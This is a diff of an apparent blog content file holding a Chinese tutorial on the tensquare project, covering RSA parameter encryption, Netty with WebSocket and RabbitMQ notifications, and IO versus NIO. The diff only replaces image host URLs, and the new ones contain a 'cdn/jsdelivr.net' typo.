 <li><p>将rsa相关的工具类复制到在com.tensquare.encrypt包下，工具类的位置在 资料\工具类\RSA 文件夹下，分别为rsa和service文件夹，均复制到com.tensquare.encrypt包下。</p>
 <font color="ff000">注意将公钥和私钥复制粘贴为自己的</font>
 
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210609-image-20210609112926584.png" alt="image-20210609112926584" style="zoom: 50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210609-image-20210609112926584.png" alt="image-20210609112926584" style="zoom: 50%;" /></p>
 </li>
 <li><p>在src/test/java文件夹下创建测试用例EncryptTest，该测试用例用于将请求参数加密，代码如下</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tensquare.encrypt.EncryptApplication;</span><br><span class="line"><span class="keyword">import</span> com.tensquare.encrypt.rsa.RsaKeys;</span><br><span class="line"><span class="keyword">import</span> com.tensquare.encrypt.service.RsaService;</span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = EncryptApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RsaService rsaService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genEncryptDataByPubKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处可替换为你自己的请求参数json字符串</span></span><br><span class="line">        String data = <span class="string">&quot;&#123;\&quot;title\&quot;:\&quot;java\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String encData = rsaService.RSAEncryptDataPEM(data, RsaKeys.getServerPubKey());</span><br><span class="line">            System.out.println(<span class="string">&quot;data: &quot;</span> + data);</span><br><span class="line">            System.out.println(<span class="string">&quot;encData: &quot;</span> + encData);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -6466,10 +6466,10 @@
 <p>私钥变量：<code>private static final String serverPrvKeyPkcs8</code></p>
 <p>8.测试请求参数加解密微服务</p>
 <p>启动tensquare_eureka，tensquare_article，tensquare_encrypt，使用EncryptTest类加密请求参数，然后使用postman进行接口调用测试</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210610-image-20210610215351967.png" alt="image-20210610215351967" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210610-image-20210610215351967.png" alt="image-20210610215351967" style="zoom:67%;" /></p>
 </li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210610-image-20210610215404211.png" alt="image-20210610215404211" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210610-image-20210610215404211.png" alt="image-20210610215404211" style="zoom:50%;" /></p>
 ]]></content>
   </entry>
   <entry>
@@ -6499,14 +6499,14 @@
 <li>如果有新消息，返回新消息通知</li>
 <li>使用WebSocket连接向，接收者返回新消息的数量</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-1559116108085.png" alt="1559116108085"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-1559116108085.png" alt="1559116108085"></p>
 <h2 id="1-2-在线时系统向接收者主动推送"><a href="#1-2-在线时系统向接收者主动推送" class="headerlink" title="1.2 在线时系统向接收者主动推送"></a>1.2 在线时系统向接收者主动推送</h2><p>此模式是系统将新的消息通知返回给接收者的模式，流程如下：</p>
 <ol>
 <li>RabbitMQ将新消息数据推送给Netty</li>
 <li>Netty从连接池中取出接收者的WebSocket连接</li>
 <li>Netty通过接收者的WebSocket连接返回新消息的数量</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-1559116667792.png" alt="1559116667792"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-1559116667792.png" alt="1559116667792"></p>
 <h1 id="2-文章订阅群发消息改进"><a href="#2-文章订阅群发消息改进" class="headerlink" title="2 文章订阅群发消息改进"></a>2 文章订阅群发消息改进</h1><p>文章订阅群发消息的改进步骤：</p>
 <ol>
 <li>准备RabbitMQ消息中间件</li>
@@ -6542,7 +6542,7 @@
 <h1 id="3-IO编程"><a href="#3-IO编程" class="headerlink" title="3 IO编程"></a>3 IO编程</h1><p>​    在开始了解Netty之前，先来实现一个客户端与服务端通信的程序，使用传统的IO编程和使用NIO编程有什么不一样。</p>
 <h2 id="3-1-传统IO编程"><a href="#3-1-传统IO编程" class="headerlink" title="3.1 传统IO编程"></a>3.1 传统IO编程</h2><p>每个客户端连接过来后，服务端都会启动一个线程去处理该客户端的请求。阻塞I/O的通信模型示意图如下：</p>
 <p>每个客户端连接过来后，服务端都会启动一个线程去处理该客户端的请求。阻塞I/O的通信模型示意图如下：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210617-io_model.jpg" alt="img"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210617-io_model.jpg" alt="img"></p>
 <p>业务场景：客户端每隔两秒发送字符串给服务端，服务端收到之后打印到控制台。</p>
 <p>服务端实现：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//IO编程服务端</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IOServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//使用阻塞的方式获取新的链接</span></span><br><span class="line">            Socket socket = serverSocket.accept();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//每个客户端连接的时候，会创建一个新线程来处理</span></span><br><span class="line">            <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    String name = Thread.currentThread().getName();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        InputStream inputStream = socket.getInputStream();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                            <span class="keyword">int</span> len;</span><br><span class="line">                            <span class="comment">//使用字节流的方式读取数据</span></span><br><span class="line">                            <span class="keyword">while</span> ((len = inputStream.read(data)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;线程&quot;</span>+ name +<span class="string">&quot;:&quot;</span>+<span class="keyword">new</span> String(data,<span class="number">0</span>,len));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -6557,7 +6557,7 @@
 <li>IO编程中数据读写是以字节流为单位，效率不高。</li>
 </ul>
 <h2 id="3-2-NIO编程"><a href="#3-2-NIO编程" class="headerlink" title="3.2 NIO编程"></a>3.2 NIO编程</h2><p>​    NIO，也叫做new-IO或者non-blocking-IO，可理解为非阻塞IO。NIO编程模型中，新来一个连接不再创建一个新的线程，而是可以把这条连接直接绑定到某个固定的线程，然后这条连接所有的读写都由这个线程来负责，我们用一幅图来对比一下IO与NIO：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210617-io_nio.png" alt="1563625482746"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210617-io_nio.png" alt="1563625482746"></p>
 <p>​    如上图所示，IO模型中，一个连接都会创建一个线程，对应一个while死循环，死循环的目的就是不断监测这条连接上是否有数据可以读。但是在大多数情况下，1万个连接里面同一时刻只有少量的连接有数据可读，因此，很多个while死循环都白白浪费掉了，因为没有数据。</p>
 <p>​    而在NIO模型中，可以把这么多的while死循环变成一个死循环，这个死循环由一个线程控制。这就是NIO模型中选择器（Selector）的作用，一条连接来了之后，现在不创建一个while死循环去监听是否有数据可读了，而是直接把这条连接注册到<strong>选择器</strong>上，通过检查这个<strong>选择器</strong>，就可以批量监测出有数据可读的连接，进而读取数据。</p>
 <p>举个栗子，在一家餐厅里，客人有点菜的需求，一共有100桌客人，有两种方案可以解决客人点菜的问题：</p>
@@ -6618,7 +6618,7 @@
 <li>有个事件泵，不断循环从队列取出事件，根据不同的事件，调用不同的函数；</li>
 <li>事件一般都各自保存各自的处理方法的引用。这样，每个事件都能找到对应的处理方法；</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210618-1563674114568.png" alt="1"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210618-1563674114568.png" alt="1"></p>
 <p>为什么使用事件驱动？</p>
 <ul>
 <li><p>程序中的任务可以并行执行</p>
@@ -6635,9 +6635,9 @@
 <li>事件通道（event channel）：分发器与处理器之间的联系渠道。</li>
 <li>事件处理器（event processor）：实现业务逻辑，处理完成后会发出事件，触发下一步操作。</li>
 </ul>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210618-image-20210618093641104.png" alt="image-20210618093641104"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210618-image-20210618093641104.png" alt="image-20210618093641104"></p>
 <h2 id="4-3-核心组件"><a href="#4-3-核心组件" class="headerlink" title="4.3 核心组件"></a>4.3 核心组件</h2><p>​    Netty 的功能特性图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210618-image-20210618093652547.png" alt="image-20210618093652547"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210618-image-20210618093652547.png" alt="image-20210618093652547"></p>
 <p>Netty 功能特性：</p>
 <ul>
 <li>传输服务，支持 BIO 和 NIO。</li>
@@ -6701,7 +6701,7 @@
 </ol>
 <p>这样消息通知微服务就引入了netty框架，并且具有了和Rabbitmq交互的能力</p>
 <h2 id="5-2-实现Netty的整合"><a href="#5-2-实现Netty的整合" class="headerlink" title="5.2 实现Netty的整合"></a>5.2 实现Netty的整合</h2><h3 id="5-2-1-整合分析"><a href="#5-2-1-整合分析" class="headerlink" title="5.2.1 整合分析"></a>5.2.1 整合分析</h3><p>现在的通讯模式如下：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210618-1563764905914.png" alt="1563764905914"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210618-1563764905914.png" alt="1563764905914"></p>
 <p>因为使用到了WebSocket和Netty，整合方式和以前有所不同，整合步骤：</p>
 <ol>
 <li>编写<code>NettyServer</code>，启动Netty服务。</li>
@@ -6711,7 +6711,7 @@
 <li>编写Rabbit监听器<code>SysNoticeListener</code>，用来获取MQ消息并进行处理。</li>
 </ol>
 <p>五个类的关系如下图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210618-image-20210618093733379.png" alt="image-20210618093733379"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210618-image-20210618093733379.png" alt="image-20210618093733379"></p>
 <h3 id="5-2-2-实现整合"><a href="#5-2-2-实现整合" class="headerlink" title="5.2.2 实现整合"></a>5.2.2 实现整合</h3><ol>
 <li><p>复制资料中的ApplicationContextProvider.java到com.tensquare.notice.config</p>
 <p>这个类是工具类，作用是获取Spring容器中的实例</p>
